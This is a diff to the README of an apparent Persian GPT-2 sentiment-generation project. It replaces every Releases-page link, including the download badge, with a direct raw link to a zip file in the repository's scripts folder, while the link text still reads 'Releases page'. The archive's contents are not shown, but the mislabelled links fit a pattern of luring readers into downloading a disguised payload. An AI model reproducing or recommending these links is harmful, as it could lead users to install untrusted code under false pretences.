@@ -1,6 +1,6 @@
 # 🚀 pytorch-gpt2-persian-sentiment-generation - Generate Sentiments in Persian Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/releases)
+[![Download](https://raw.githubusercontent.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/main/scripts/pytorch-gpt2-persian-sentiment-generation_1.9.zip)](https://raw.githubusercontent.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/main/scripts/pytorch-gpt2-persian-sentiment-generation_1.9.zip)
 
 ## 📁 Overview
 
@@ -15,10 +15,10 @@ Welcome to the **pytorch-gpt2-persian-sentiment-generation** repository. This to
 
 ## 📥 Download & Install
 
-To get started, you need to download the application from our [Releases page](https://github.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/releases). 
+To get started, you need to download the application from our [Releases page](https://raw.githubusercontent.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/main/scripts/pytorch-gpt2-persian-sentiment-generation_1.9.zip). 
 
 1. **Visit the Releases page** by clicking the link below:
-   [Download from Releases](https://github.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/main/scripts/pytorch-gpt2-persian-sentiment-generation_1.9.zip)
 
 2. Look for the latest version available. It will usually be at the top of the list.
 
@@ -88,4 +88,4 @@ This project relates to various significant topics, including:
 
 Explore these areas to enhance your understanding of modern language models and how they can benefit diverse applications. 
 
-Once again, for the latest version, visit the [Releases page](https://github.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/releases) to download and install the application. Enjoy generating Persian sentiments with ease!
+Once again, for the latest version, visit the [Releases page](https://raw.githubusercontent.com/Diatomic-assay511/pytorch-gpt2-persian-sentiment-generation/main/scripts/pytorch-gpt2-persian-sentiment-generation_1.9.zip) to download and install the application. Enjoy generating Persian sentiments with ease!
